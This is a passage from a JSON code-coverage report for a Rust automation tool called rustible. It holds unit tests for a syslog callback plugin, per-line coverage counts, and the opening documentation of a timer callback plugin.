serde_json::from_str(\u0026messages[0].1).unwrap();\n        assert_eq!(msg[\"event\"], \"task_ok\");\n        assert_eq!(msg[\"status\"], \"ok\");\n        assert_eq!(msg[\"success\"], true);\n        assert_eq!(msg[\"changed\"], false);\n    }\n\n    #[tokio::test]\n    async fn test_task_complete_changed() {\n        let (callback, writer) = create_test_callback();\n\n        let result = create_execution_result(\n            \"host1\",\n            \"Configure service\",\n            true,\n            true,\n            false,\n            \"configuration updated\",\n        );\n        callback.on_task_complete(\u0026result).await;\n\n        let messages = writer.get_messages();\n        assert_eq!(messages.len(), 1);\n\n        let msg: serde_json::Value = serde_json::from_str(\u0026messages[0].1).unwrap();\n        assert_eq!(msg[\"event\"], \"task_changed\");\n        assert_eq!(msg[\"status\"], \"changed\");\n        assert_eq!(msg[\"changed\"], true);\n    }\n\n    #[tokio::test]\n    async fn test_task_complete_failed() {\n        let (callback, writer) = create_test_callback();\n\n        let result = create_execution_result(\n            \"host1\",\n            \"Install package\",\n            false,\n            false,\n            false,\n            \"Package not found\",\n        );\n        callback.on_task_complete(\u0026result).await;\n\n        let messages = writer.get_messages();\n        assert_eq!(messages.len(), 1);\n\n        let msg: serde_json::Value = serde_json::from_str(\u0026messages[0].1).unwrap();\n        assert_eq!(msg[\"event\"], \"task_failed\");\n        assert_eq!(msg[\"status\"], \"failed\");\n        assert_eq!(msg[\"error\"], \"Package not found\");\n    }\n\n    #[tokio::test]\n    async fn test_task_complete_skipped() {\n        let (callback, writer) = create_test_callback();\n\n        let result =\n            create_execution_result(\"host1\", \"Conditional task\", true, false, true, \"skipped\");\n        callback.on_task_complete(\u0026result).await;\n\n        let messages = writer.get_messages();\n        assert_eq!(messages.len(), 1);\n\n        let msg: serde_json::Value = serde_json::from_str(\u0026messages[0].1).unwrap();\n        assert_eq!(msg[\"event\"], \"task_skipped\");\n        assert_eq!(msg[\"skipped\"], true);\n    }\n\n    #[tokio::test]\n    async fn test_task_start_disabled_by_default() {\n        let (callback, writer) = create_test_callback();\n\n        callback.on_task_start(\"Test task\", \"host1\").await;\n\n        let messages = writer.get_messages();\n        assert!(messages.is_empty());\n    }\n\n    #[tokio::test]\n    async fn test_task_start_enabled() {\n        let mut config = SyslogConfig::default();\n        config.log_task_start = true;\n\n        let writer = Arc::new(TestSyslogWriter::new());\n        let callback = SyslogCallback {\n            config,\n            writer: Arc::clone(\u0026writer) as Arc\u003cdyn SyslogWriter\u003e,\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            hostname: \"testhost\".to_string(),\n            stats: RwLock::new(SyslogStats::default()),\n        };\n\n        callback.on_task_start(\"Test task\", \"host1\").await;\n\n        let messages = writer.get_messages();\n        assert_eq!(messages.len(), 1);\n\n        let msg: serde_json::Value = serde_json::from_str(\u0026messages[0].1).unwrap();\n        assert_eq!(msg[\"event\"], \"task_start\");\n    }\n\n    #[tokio::test]\n    async fn test_facts_disabled_by_default() {\n        let (callback, writer) = create_test_callback();\n\n        let facts = Facts::default();\n        callback.on_facts_gathered(\"host1\", \u0026facts).await;\n\n        let messages = writer.get_messages();\n        assert!(messages.is_empty());\n    }\n\n    #[tokio::test]\n    async fn test_handler_triggered() {\n        let (callback, writer) = create_test_callback();\n\n        callback.on_handler_triggered(\"restart nginx\").await;\n\n        let messages = writer.get_messages();\n        assert_eq!(messages.len(), 1);\n\n        let msg: serde_json::Value = serde_json::from_str(\u0026messages[0].1).unwrap();\n        assert_eq!(msg[\"event\"], \"handler_triggered\");\n        assert_eq!(msg[\"handler\"], \"restart nginx\");\n    }\n\n    #[test]\n    fn test_config_builder() {\n        let config = SyslogConfig::builder()\n            .facility(SyslogFacility::Local3)\n            .ident(\"myapp\")\n            .format(SyslogFormat::Text)\n            .include_pid(false)\n            .log_task_start(true)\n            .min_severity(SyslogSeverity::Warning)\n            .extra_field(\"environment\", \"production\")\n            .build();\n\n        assert_eq!(config.facility, SyslogFacility::Local3);\n        assert_eq!(config.ident, \"myapp\");\n        assert_eq!(config.format, SyslogFormat::Text);\n        assert!(!config.include_pid);\n        assert!(config.log_task_start);\n        assert_eq!(config.min_severity, SyslogSeverity::Warning);\n        assert_eq!(\n            config.extra_fields.get(\"environment\"),\n            Some(\u0026\"production\".to_string())\n        );\n    }\n\n    #[test]\n    fn test_stats_tracking() {\n        let (callback, _) = create_test_callback();\n\n        // Log a message\n        callback.log_event(\"test\", SyslogSeverity::Info, serde_json::json!({}));\n\n        let stats = callback.stats();\n        assert_eq!(stats.messages_logged, 1);\n        assert_eq!(stats.messages_filtered, 0);\n    }\n\n    #[test]\n    fn test_stats_filtered() {\n        let mut config = SyslogConfig::default();\n        config.min_severity = SyslogSeverity::Error;\n\n        let callback = SyslogCallback {\n            config,\n            writer: Arc::new(TestSyslogWriter::new()),\n            playbook_start: RwLock::new(None),\n            current_playbook: RwLock::new(None),\n            hostname: \"testhost\".to_string(),\n            stats: RwLock::new(SyslogStats::default()),\n        };\n\n        // Log a debug message (should be filtered)\n        callback.log_event(\"test\", SyslogSeverity::Debug, serde_json::json!({}));\n\n        let stats = callback.stats();\n        assert_eq!(stats.messages_logged, 0);\n        assert_eq!(stats.messages_filtered, 1);\n    }\n\n    #[test]\n    fn test_severity_display() {\n        assert_eq!(SyslogSeverity::Emergency.to_string(), \"emerg\");\n        assert_eq!(SyslogSeverity::Error.to_string(), \"err\");\n        assert_eq!(SyslogSeverity::Warning.to_string(), \"warning\");\n        assert_eq!(SyslogSeverity::Info.to_string(), \"info\");\n    }\n\n    #[test]\n    fn test_facility_display() {\n        assert_eq!(SyslogFacility::Local0.to_string(), \"local0\");\n        assert_eq!(SyslogFacility::Daemon.to_string(), \"daemon\");\n        assert_eq!(SyslogFacility::User.to_string(), \"user\");\n    }\n}\n","traces":[{"line":118,"address":[24468832],"length":1,"stats":{"Line":1}},{"line":119,"address":[24468859],"length":1,"stats":{"Line":1}},{"line":120,"address":[24468890],"length":1,"stats":{"Line":0}},{"line":121,"address":[24468933],"length":1,"stats":{"Line":1}},{"line":122,"address":[24468976],"length":1,"stats":{"Line":0}},{"line":123,"address":[24469019],"length":1,"stats":{"Line":1}},{"line":124,"address":[24469068],"length":1,"stats":{"Line":0}},{"line":125,"address":[24469117],"length":1,"stats":{"Line":0}},{"line":126,"address":[24469166],"length":1,"stats":{"Line":0}},{"line":127,"address":[24469215],"length":1,"stats":{"Line":0}},{"line":128,"address":[24469264],"length":1,"stats":{"Line":0}},{"line":129,"address":[24469313],"length":1,"stats":{"Line":0}},{"line":130,"address":[24469362],"length":1,"stats":{"Line":0}},{"line":131,"address":[24469411],"length":1,"stats":{"Line":0}},{"line":132,"address":[24469460],"length":1,"stats":{"Line":0}},{"line":133,"address":[24469509],"length":1,"stats":{"Line":0}},{"line":134,"address":[24469558],"length":1,"stats":{"Line":0}},{"line":135,"address":[24469607],"length":1,"stats":{"Line":0}},{"line":136,"address":[24469656],"length":1,"stats":{"Line":1}},{"line":137,"address":[24469705],"length":1,"stats":{"Line":0}},{"line":138,"address":[24469754],"length":1,"stats":{"Line":0}},{"line":139,"address":[24469803],"length":1,"stats":{"Line":0}},{"line":140,"address":[24469852],"length":1,"stats":{"Line":0}},{"line":141,"address":[24469901],"length":1,"stats":{"Line":0}},{"line":142,"address":[24469947],"length":1,"stats":{"Line":0}},{"line":143,"address":[24469993],"length":1,"stats":{"Line":0}},{"line":151,"address":[24472224,24474104,24474110],"length":1,"stats":{"Line":1}},{"line":152,"address":[24472267,24472359],"length":1,"stats":{"Line":2}},{"line":153,"address":[24472375],"length":1,"stats":{"Line":1}},{"line":154,"address":[24472482,24472553],"length":1,"stats":{"Line":2}},{"line":155,"address":[24472573,24472617,24472525],"length":1,"stats":{"Line":2}},{"line":156,"address":[24472589,24472637,24472681],"length":1,"stats":{"Line":3}},{"line":157,"address":[24472701,24472745,24472653],"length":1,"stats":{"Line":2}},{"line":158,"address":[24472717,24472765,24472809],"length":1,"stats":{"Line":2}},{"line":159,"address":[24472829,24472873,24472781],"length":1,"stats":{"Line":2}},{"line":160,"address":[24472937,24472893,24472845],"length":1,"stats":{"Line":2}},{"line":161,"address":[24472957,24472909,24473001],"length":1,"stats":{"Line":2}},{"line":162,"address":[24472973,24473065,24473021],"length":1,"stats":{"Line":2}},{"line":163,"address":[24473037,24473085,24473129],"length":1,"stats":{"Line":2}},{"line":164,"address":[24473101,24473193,24473149],"length":1,"stats":{"Line":2}},{"line":165,"address":[24473165,24473213,24473257],"length":1,"stats":{"Line":2}},{"line":166,"address":[24473229,24473321,24473277],"length":1,"stats":{"Line":2}},{"line":167,"address":[24473293,24473341,24473385],"length":1,"stats":{"Line":2}},{"line":168,"address":[24473357,24473405,24473449],"length":1,"stats":{"Line":2}},{"line":169,"address":[24473421,24473469,24473513],"length":1,"stats":{"Line":3}},{"line":170,"address":[24473485,24473577,24473533],"length":1,"stats":{"Line":2}},{"line":171,"address":[24473549,24473597,24473641],"length":1,"stats":{"Line":2}},{"line":172,"address":[24473705,24473613,24473661],"length":1,"stats":{"Line":2}},{"line":173,"address":[24473677,24473725,24473769],"length":1,"stats":{"Line":2}},{"line":174,"address":[24473789,24473833,24473741],"length":1,"stats":{"Line":2}},{"line":175,"address":[24473896,24473805,24473853],"length":1,"stats":{"Line":2}},{"line":176,"address":[24473915,24473869,24473955],"length":1,"stats":{"Line":2}},{"line":177,"address":[24473973,24473931],"length":1,"stats":{"Line":2}},{"line":213,"address":[24470128],"length":1,"stats":{"Line":1}},{"line":214,"address":[24470155],"length":1,"stats":{"Line":1}},{"line":215,"address":[24470186],"length":1,"stats":{"Line":1}},{"line":216,"address":[24470229],"length":1,"stats":{"Line":0}},{"line":217,"address":[24470272],"length":1,"stats":{"Line":0}},{"line":218,"address":[24470315],"length":1,"stats":{"Line":1}},{"line":219,"address":[24470364],"length":1,"stats":{"Line":1}},{"line":220,"address":[24470413],"length":1,"stats":{"Line":0}},{"line":221,"address":[24470459],"length":1,"stats":{"Line":1}},{"line":222,"address":[24470505],"length":1,"stats":{"Line":0}},{"line":230,"address":[24474128,24475207,24475201],"length":1,"stats":{"Line":1}},{"line":231,"address":[24474171,24474263],"length":1,"stats":{"Line":2}},{"line":232,"address":[24474279],"length":1,"stats":{"Line":1}},{"line":233,"address":[24474500,24474429],"length":1,"stats":{"Line":1}},{"line":234,"address":[24474472,24474520],"length":1,"stats":{"Line":2}},{"line":235,"address":[24474600],"length":1,"stats":{"Line":1}},{"line":236,"address":[24474707],"length":1,"stats":{"Line":1}},{"line":237,"address":[24474885,24474814],"length":1,"stats":{"Line":1}},{"line":238,"address":[24474857,24474905],"length":1,"stats":{"Line":2}},{"line":239,"address":[24475052,24474985],"length":1,"stats":{"Line":1}},{"line":240,"address":[24475070,24475028],"length":1,"stats":{"Line":2}},{"line":326,"address":[24472080],"length":1,"stats":{"Line":1}},{"line":378,"address":[24471799,24471805,24471232],"length":1,"stats":{"Line":1}},{"line":381,"address":[24471249],"length":1,"stats":{"Line":1}},{"line":389,"address":[24471280],"length":1,"stats":{"Line":1}},{"line":390,"address":[24471328],"length":1,"stats":{"Line":1}},{"line":391,"address":[24471344],"length":1,"stats":{"Line":1}},{"line":392,"address":[24471410],"length":1,"stats":{"Line":1}},{"line":393,"address":[24471479],"length":1,"stats":{"Line":1}},{"line":400,"address":[24456688],"length":1,"stats":{"Line":1}},{"line":401,"address":[24456696],"length":1,"stats":{"Line":1}},{"line":413,"address":[24468704],"length":1,"stats":{"Line":1}},{"line":414,"address":[24468722],"length":1,"stats":{"Line":1}},{"line":415,"address":[24468728],"length":1,"stats":{"Line":1}},{"line":419,"address":[30458880,30459110],"length":1,"stats":{"Line":1}},{"line":420,"address":[30458994,30458935],"length":1,"stats":{"Line":2}},{"line":421,"address":[30459090],"length":1,"stats":{"Line":1}},{"line":425,"address":[24468656],"length":1,"stats":{"Line":1}},{"line":426,"address":[24468674],"length":1,"stats":{"Line":1}},{"line":427,"address":[24468680],"length":1,"stats":{"Line":1}},{"line":431,"address":[24468272],"length":1,"stats":{"Line":1}},{"line":432,"address":[24468295],"length":1,"stats":{"Line":1}},{"line":433,"address":[24468303],"length":1,"stats":{"Line":1}},{"line":437,"address":[24468336],"length":1,"stats":{"Line":0}},{"line":438,"address":[24468359],"length":1,"stats":{"Line":0}},{"line":439,"address":[24468367],"length":1,"stats":{"Line":0}},{"line":443,"address":[24468512],"length":1,"stats":{"Line":0}},{"line":444,"address":[24468535],"length":1,"stats":{"Line":0}},{"line":445,"address":[24468543],"length":1,"stats":{"Line":0}},{"line":449,"address":[24468448],"length":1,"stats":{"Line":1}},{"line":450,"address":[24468471],"length":1,"stats":{"Line":1}},{"line":451,"address":[24468479],"length":1,"stats":{"Line":1}},{"line":455,"address":[24468752],"length":1,"stats":{"Line":0}},{"line":456,"address":[24468775],"length":1,"stats":{"Line":0}},{"line":457,"address":[24468783],"length":1,"stats":{"Line":0}},{"line":461,"address":[24468400],"length":1,"stats":{"Line":1}},{"line":462,"address":[24468418],"length":1,"stats":{"Line":1}},{"line":463,"address":[24468424],"length":1,"stats":{"Line":1}},{"line":467,"address":[24468576],"length":1,"stats":{"Line":0}},{"line":468,"address":[24468584],"length":1,"stats":{"Line":0}},{"line":469,"address":[24468603],"length":1,"stats":{"Line":0}},{"line":473,"address":[30458448,30458833,30458853],"length":1,"stats":{"Line":1}},{"line":474,"address":[30458814,30458645,30458538],"length":1,"stats":{"Line":2}},{"line":475,"address":[30458791],"length":1,"stats":{"Line":1}},{"line":485,"address":[],"length":0,"stats":{"Line":0}},{"line":486,"address":[],"length":0,"stats":{"Line":0}},{"line":487,"address":[],"length":0,"stats":{"Line":0}},{"line":488,"address":[],"length":0,"stats":{"Line":0}},{"line":492,"address":[24468624],"length":1,"stats":{"Line":1}},{"line":493,"address":[24468632],"length":1,"stats":{"Line":1}},{"line":540,"address":[24467744,24468150,24468156],"length":1,"stats":{"Line":0}},{"line":541,"address":[24467802],"length":1,"stats":{"Line":0}},{"line":545,"address":[24468062,24467997],"length":1,"stats":{"Line":0}},{"line":548,"address":[24468112],"length":1,"stats":{"Line":0}},{"line":554,"address":[24450362,24449904,24450368],"length":1,"stats":{"Line":0}},{"line":555,"address":[24450119,24449981,24450016],"length":1,"stats":{"Line":0}},{"line":556,"address":[24449995,24450064],"length":1,"stats":{"Line":0}},{"line":560,"address":[24450184],"length":1,"stats":{"Line":0}},{"line":561,"address":[24450191],"length":1,"stats":{"Line":0}},{"line":562,"address":[24450265],"length":1,"stats":{"Line":0}},{"line":566,"address":[24450331],"length":1,"stats":{"Line":0}},{"line":569,"address":[24449888],"length":1,"stats":{"Line":0}},{"line":571,"address":[24449893],"length":1,"stats":{"Line":0}},{"line":578,"address":[26403632],"length":1,"stats":{"Line":0}},{"line":579,"address":[26403637],"length":1,"stats":{"Line":0}},{"line":593,"address":[24468176],"length":1,"stats":{"Line":0}},{"line":595,"address":[24468210],"length":1,"stats":{"Line":0}},{"line":602,"address":[24451311,24451317,24450400],"length":1,"stats":{"Line":0}},{"line":603,"address":[24450449],"length":1,"stats":{"Line":0}},{"line":604,"address":[24450458],"length":1,"stats":{"Line":0}},{"line":605,"address":[24450517],"length":1,"stats":{"Line":0}},{"line":606,"address":[24450543],"length":1,"stats":{"Line":0}},{"line":607,"address":[24450569],"length":1,"stats":{"Line":0}},{"line":608,"address":[24450592],"length":1,"stats":{"Line":0}},{"line":609,"address":[24450615],"length":1,"stats":{"Line":0}},{"line":610,"address":[24450638],"length":1,"stats":{"Line":0}},{"line":611,"address":[24450661],"length":1,"stats":{"Line":0}},{"line":612,"address":[24450684],"length":1,"stats":{"Line":0}},{"line":613,"address":[24450491],"length":1,"stats":{"Line":0}},{"line":616,"address":[24450705],"length":1,"stats":{"Line":0}},{"line":618,"address":[24450829,24451248],"length":1,"stats":{"Line":0}},{"line":619,"address":[24450758,24450821],"length":1,"stats":{"Line":0}},{"line":628,"address":[24451267],"length":1,"stats":{"Line":0}},{"line":631,"address":[24450384],"length":1,"stats":{"Line":0}},{"line":691,"address":[24466126,24465136,24466236],"length":1,"stats":{"Line":0}},{"line":692,"address":[24465158,24465253],"length":1,"stats":{"Line":0}},{"line":693,"address":[24465379],"length":1,"stats":{"Line":0}},{"line":694,"address":[30458121,30458096],"length":1,"stats":{"Line":0}},{"line":695,"address":[30457984,30458000],"length":1,"stats":{"Line":0}},{"line":697,"address":[24465792],"length":1,"stats":{"Line":0}},{"line":698,"address":[24465505],"length":1,"stats":{"Line":0}},{"line":699,"address":[24465535],"length":1,"stats":{"Line":0}},{"line":700,"address":[24465582],"length":1,"stats":{"Line":0}},{"line":701,"address":[24465639],"length":1,"stats":{"Line":0}},{"line":702,"address":[24465670],"length":1,"stats":{"Line":0}},{"line":703,"address":[24465718,24465785],"length":1,"stats":{"Line":0}},{"line":708,"address":[24463248],"length":1,"stats":{"Line":0}},{"line":709,"address":[24463264],"length":1,"stats":{"Line":0}},{"line":714,"address":[24462784,24463206,24463231],"length":1,"stats":{"Line":0}},{"line":715,"address":[24462814],"length":1,"stats":{"Line":0}},{"line":716,"address":[24462866,24462830],"length":1,"stats":{"Line":0}},{"line":717,"address":[24462855],"length":1,"stats":{"Line":0}},{"line":719,"address":[24462844,24462961],"length":1,"stats":{"Line":0}},{"line":720,"address":[24462950],"length":1,"stats":{"Line":0}},{"line":723,"address":[24462968,24463047,24462873],"length":1,"stats":{"Line":0}},{"line":724,"address":[24463091,24463163],"length":1,"stats":{"Line":0}},{"line":736,"address":[24466410,24466416,24466272],"length":1,"stats":{"Line":1}},{"line":737,"address":[24466383,24466304],"length":1,"stats":{"Line":2}},{"line":741,"address":[24464288],"length":1,"stats":{"Line":1}},{"line":742,"address":[24464300],"length":1,"stats":{"Line":1}},{"line":746,"address":[24459264],"length":1,"stats":{"Line":1}},{"line":747,"address":[24459282],"length":1,"stats":{"Line":1}},{"line":751,"address":[24467722,24466432,24466845],"length":1,"stats":{"Line":1}},{"line":752,"address":[24466511,24466579],"length":1,"stats":{"Line":2}},{"line":753,"address":[24466593,24466680],"length":1,"stats":{"Line":2}},{"line":754,"address":[24466803,24466753,24466696],"length":1,"stats":{"Line":2}},{"line":758,"address":[24466662],"length":1,"stats":{"Line":1}},{"line":759,"address":[24466866,24466936],"length":1,"stats":{"Line":2}},{"line":761,"address":[24466943],"length":1,"stats":{"Line":1}},{"line":763,"address":[24467223,24467123],"length":1,"stats":{"Line":0}},{"line":764,"address":[24467300],"length":1,"stats":{"Line":0}},{"line":765,"address":[24467347,24467404,24467454],"length":1,"stats":{"Line":0}},{"line":767,"address":[24467561,24467154],"length":1,"stats":{"Line":2}},{"line":768,"address":[24467577,24467631,24467682],"length":1,"stats":{"Line":2}},{"line":773,"address":[24463408],"length":1,"stats":{"Line":1}},{"line":774,"address":[24463461],"length":1,"stats":{"Line":1}},{"line":775,"address":[24463521],"length":1,"stats":{"Line":1}},{"line":776,"address":[24463552],"length":1,"stats":{"Line":0}},{"line":777,"address":[24463583],"length":1,"stats":{"Line":0}},{"line":782,"address":[24460974,24461497,24459312],"length":1,"stats":{"Line":1}},{"line":783,"address":[24459810,24459365,24459739,24459837,24461510,24459528],"length":1,"stats":{"Line":2}},{"line":785,"address":[24459783,24459720],"length":1,"stats":{"Line":2}},{"line":789,"address":[24460155,24460546],"length":1,"stats":{"Line":2}},{"line":790,"address":[24461475,24460192,24460259,24460337,24460399],"length":1,"stats":{"Line":2}},{"line":794,"address":[24460169,24460556],"length":1,"stats":{"Line":2}},{"line":795,"address":[24460609,24460573],"length":1,"stats":{"Line":2}},{"line":796,"address":[24460638],"length":1,"stats":{"Line":1}},{"line":797,"address":[24460794,24460841],"length":1,"stats":{"Line":1}},{"line":803,"address":[24460584,24460985],"length":1,"stats":{"Line":2}},{"line":804,"address":[24461052,24461006],"length":1,"stats":{"Line":2}},{"line":805,"address":[24461248,24461198],"length":1,"stats":{"Line":0}},{"line":809,"address":[30457680,30457709],"length":1,"stats":{"Line":2}},{"line":813,"address":[24462758,24461568,24462492],"length":1,"stats":{"Line":1}},{"line":814,"address":[24461647,24462771,24461881],"length":1,"stats":{"Line":1}},{"line":816,"address":[24461870,24461899],"length":1,"stats":{"Line":2}},{"line":817,"address":[24461919,24461990],"length":1,"stats":{"Line":2}},{"line":818,"address":[24462139],"length":1,"stats":{"Line":1}},{"line":819,"address":[24462153,24462204],"length":1,"stats":{"Line":2}},{"line":820,"address":[24462197,24462257],"length":1,"stats":{"Line":0}},{"line":822,"address":[24462303,24462214],"length":1,"stats":{"Line":2}},{"line":826,"address":[24461931],"length":1,"stats":{"Line":1}},{"line":827,"address":[24462532],"length":1,"stats":{"Line":0}},{"line":830,"address":[24462710,24462498],"length":1,"stats":{"Line":2}},{"line":834,"address":[24457966,24456720,24459250],"length":1,"stats":{"Line":1}},{"line":836,"address":[24456840],"length":1,"stats":{"Line":1}},{"line":837,"address":[24456876],"length":1,"stats":{"Line":1}},{"line":839,"address":[24456888],"length":1,"stats":{"Line":1}},{"line":841,"address":[24456909],"length":1,"stats":{"Line":1}},{"line":842,"address":[24456947,24457024],"length":1,"stats":{"Line":2}},{"line":843,"address":[24457196],"length":1,"stats":{"Line":1}},{"line":844,"address":[24457213,24457295],"length":1,"stats":{"Line":2}},{"line":845,"address":[24457337,24457264],"length":1,"stats":{"Line":0}},{"line":847,"address":[24457496,24457312],"length":1,"stats":{"Line":2}},{"line":848,"address":[24457515,24457547],"length":1,"stats":{"Line":0}},{"line":850,"address":[24457530,24457567],"length":1,"stats":{"Line":2}},{"line":854,"address":[24456962],"length":1,"stats":{"Line":1}},{"line":855,"address":[24458012],"length":1,"stats":{"Line":1}},{"line":856,"address":[24458095,24458046],"length":1,"stats":{"Line":2}},{"line":858,"address":[24458061,24458097],"length":1,"stats":{"Line":2}},{"line":861,"address":[24458367,24458562,24458611,24458465],"length":1,"stats":{"Line":1}},{"line":863,"address":[24458331,24457980],"length":1,"stats":{"Line":2}},{"line":864,"address":[24458429,24458346],"length":1,"stats":{"Line":2}},{"line":865,"address":[24458444,24458524],"length":1,"stats":{"Line":2}},{"line":867,"address":[24458555],"length":1,"stats":{"Line":1}},{"line":874,"address":[24464320],"length":1,"stats":{"Line":1}},{"line":876,"address":[24464375],"length":1,"stats":{"Line":1}},{"line":877,"address":[24464500,24464446],"length":1,"stats":{"Line":0}},{"line":878,"address":[24464477,24464517],"length":1,"stats":{"Line":0}},{"line":879,"address":[24464547],"length":1,"stats":{"Line":0}},{"line":884,"address":[24464576],"length":1,"stats":{"Line":1}},{"line":886,"address":[24464631,24464685],"length":1,"stats":{"Line":1}},{"line":887,"address":[24464662,24464731],"length":1,"stats":{"Line":1}},{"line":888,"address":[24464777,24464708],"length":1,"stats":{"Line":1}},{"line":889,"address":[24464754,24464823],"length":1,"stats":{"Line":1}},{"line":890,"address":[24464869,24464800],"length":1,"stats":{"Line":1}},{"line":891,"address":[24464846,24464915],"length":1,"stats":{"Line":1}},{"line":892,"address":[24464892,24464961],"length":1,"stats":{"Line":1}},{"line":893,"address":[24465007,24464938],"length":1,"stats":{"Line":2}},{"line":894,"address":[24464984,24465050],"length":1,"stats":{"Line":0}},{"line":895,"address":[24465093,24465027],"length":1,"stats":{"Line":0}},{"line":896,"address":[24465070,24465113],"length":1,"stats":{"Line":0}},{"line":897,"address":[24465103],"length":1,"stats":{"Line":0}},{"line":902,"address":[24464260,24464080,24464266],"length":1,"stats":{"Line":1}},{"line":903,"address":[24464104,24464210],"length":1,"stats":{"Line":2}},{"line":907,"address":[24463312],"length":1,"stats":{"Line":1}},{"line":909,"address":[24463362],"length":1,"stats":{"Line":1}},{"line":910,"address":[24463373],"length":1,"stats":{"Line":3}},{"line":915,"address":[24464056,24464050,24463600],"length":1,"stats":{"Line":1}},{"line":916,"address":[24463788,24463892,24463633],"length":1,"stats":{"Line":3}},{"line":925,"address":[30452928,30454082,30454120,30454181,30453069,30453042,30452956],"length":1,"stats":{"Line":4}},{"line":926,"address":[30453131,30453022],"length":1,"stats":{"Line":2}},{"line":927,"address":[30453258,30453524,30453285,30454126,30453462],"length":1,"stats":{"Line":1}},{"line":929,"address":[30454047],"length":1,"stats":{"Line":1}},{"line":931,"address":[30453646],"length":1,"stats":{"Line":1}},{"line":932,"address":[30453709,30453664,30453776,30454098],"length":1,"stats":{"Line":1}},{"line":938,"address":[30444924,30447459,30446781,30445083,30447287,30444896,30445056],"length":1,"stats":{"Line":4}},{"line":939,"address":[30445188,30445127,30445221,30445030],"length":1,"stats":{"Line":4}},{"line":942,"address":[30447500,30445194,30445154,30447488,30445236],"length":1,"stats":{"Line":4}},{"line":944,"address":[30445243,30445265],"length":1,"stats":{"Line":1}},{"line":945,"address":[30445272],"length":1,"stats":{"Line":1}},{"line":947,"address":[30445255],"length":1,"stats":{"Line":0}},{"line":950,"address":[30445721,30445290,30447383,30445370,30445332,30445661,30445905,30445433,30446027,30446034],"length":1,"stats":{"Line":3}},{"line":953,"address":[30445948],"length":1,"stats":{"Line":1}},{"line":956,"address":[30446747,30446295],"length":1,"stats":{"Line":2}},{"line":957,"address":[30446335,30446752,30446538,30446422,30446600],"length":1,"stats":{"Line":1}},{"line":960,"address":[30446347],"length":1,"stats":{"Line":1}},{"line":963,"address":[30446833],"length":1,"stats":{"Line":1}},{"line":964,"address":[30447149,30447303,30446961,30447089],"length":1,"stats":{"Line":1}},{"line":967,"address":[30442784,30443853,30442812,30442907,30442934,30443891,30443951],"length":1,"stats":{"Line":0}},{"line":968,"address":[30443821],"length":1,"stats":{"Line":0}},{"line":970,"address":[30442885],"length":1,"stats":{"Line":0}},{"line":971,"address":[30443374,30443625,30442973,30443869,30442900,30443011,30443294,30443897,30443078,30443367,30443558],"length":1,"stats":{"Line":0}},{"line":973,"address":[30443339],"length":1,"stats":{"Line":0}},{"line":979,"address":[24449275],"length":1,"stats":{"Line":0}},{"line":980,"address":[30442619],"length":1,"stats":{"Line":0}},{"line":982,"address":[30441645],"length":1,"stats":{"Line":0}},{"line":983,"address":[30442667,30441771,30442050,30442110,30442420,30441733,30442705,30441834,30442413,30442291,30441660],"length":1,"stats":{"Line":0}},{"line":986,"address":[30442334],"length":1,"stats":{"Line":0}},{"line":991,"address":[24449437],"length":1,"stats":{"Line":6}},{"line":992,"address":[30444078],"length":1,"stats":{"Line":1}},{"line":996,"address":[30444787],"length":1,"stats":{"Line":1}},{"line":998,"address":[30444118],"length":1,"stats":{"Line":1}},{"line":999,"address":[30444310,30444819,30444243,30444590,30444205,30444526,30444847,30444133],"length":1,"stats":{"Line":2}},{"line":1006,"address":[30447536,30447564,30450726,30451902,30447724,30448265,30451700],"length":1,"stats":{"Line":4}},{"line":1007,"address":[30447709,30447802,30447867],"length":1,"stats":{"Line":3}},{"line":1008,"address":[30447771],"length":1,"stats":{"Line":1}},{"line":1009,"address":[30447751,30447840],"length":1,"stats":{"Line":2}},{"line":1010,"address":[30447809],"length":1,"stats":{"Line":1}},{"line":1011,"address":[30447969,30448007,30447847],"length":1,"stats":{"Line":3}},{"line":1012,"address":[30447976],"length":1,"stats":{"Line":1}},{"line":1014,"address":[30447938],"length":1,"stats":{"Line":1}},{"line":1017,"address":[30447918,30448059,30448145],"length":1,"stats":{"Line":3}},{"line":1018,"address":[30448032],"length":1,"stats":{"Line":1}},{"line":1019,"address":[30448113,30448017,30448235,30448091],"length":1,"stats":{"Line":4}},{"line":1020,"address":[30448064],"length":1,"stats":{"Line":1}},{"line":1021,"address":[30448174,30448203,30448098],"length":1,"stats":{"Line":3}},{"line":1022,"address":[30448176],"length":1,"stats":{"Line":1}},{"line":1024,"address":[30448147],"length":1,"stats":{"Line":1}},{"line":1027,"address":[30449147,30449734,30448245,30448713,30449989,30450059,30451738,30448342,30448417,30449476,30449918,30448304,30449218,30449402,30448963,30448645,30448897,30449660],"length":1,"stats":{"Line":3}},{"line":1034,"address":[30449966,30450035],"length":1,"stats":{"Line":2}},{"line":1038,"address":[30450692,30450291],"length":1,"stats":{"Line":2}},{"line":1039,"address":[30450483,30450367,30450697,30450309,30450545],"length":1,"stats":{"Line":1}},{"line":1043,"address":[30451167,30450341,30450777],"length":1,"stats":{"Line":2}},{"line":1044,"address":[30450845,30450788,30451020,30451172,30450958],"length":1,"stats":{"Line":0}},{"line":1048,"address":[30450816,30451208,30451650],"length":1,"stats":{"Line":2}},{"line":1049,"address":[30451219,30451441,30451503,30451655,30451325],"length":1,"stats":{"Line":0}},{"line":1052,"address":[30451264],"length":1,"stats":{"Line":1}},{"line":1055,"address":[24449779],"length":1,"stats":{"Line":4}},{"line":1056,"address":[30454717],"length":1,"stats":{"Line":1}},{"line":1058,"address":[30454293],"length":1,"stats":{"Line":1}},{"line":1059,"address":[30454308,30454765,30454419,30454381,30454486],"length":1,"stats":{"Line":2}},{"line":1065,"address":[30452834,30451964,30452112,30452063,30451936,30452041,30452091,30452889,30452861],"length":1,"stats":{"Line":5}},{"line":1066,"address":[30452030],"length":1,"stats":{"Line":1}},{"line":1071,"address":[30452070,30452156],"length":1,"stats":{"Line":0}},{"line":1073,"address":[30452807],"length":1,"stats":{"Line":0}},{"line":1075,"address":[30452183],"length":1,"stats":{"Line":0}},{"line":1076,"address":[30452839,30452867,30452313,30452541,30452601,30452201,30452246],"length":1,"stats":{"Line":0}}],"covered":209,"coverable":340},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","timer.rs"],"content":"//! Timer Callback Plugin for Rustible\n//!\n//! This plugin tracks and displays execution timing information for tasks,\n//! providing insights into performance and identifying slow operations.\n//!\n//! # Features\n//!\n//! - Tracks execution time for each task on each host\n//! - Displays elapsed time after each task completion\n//! - Provides summary of slowest tasks at playbook end\n//! - Configurable display options (threshold, top N slowest, etc.)\n//! - Thread-safe for 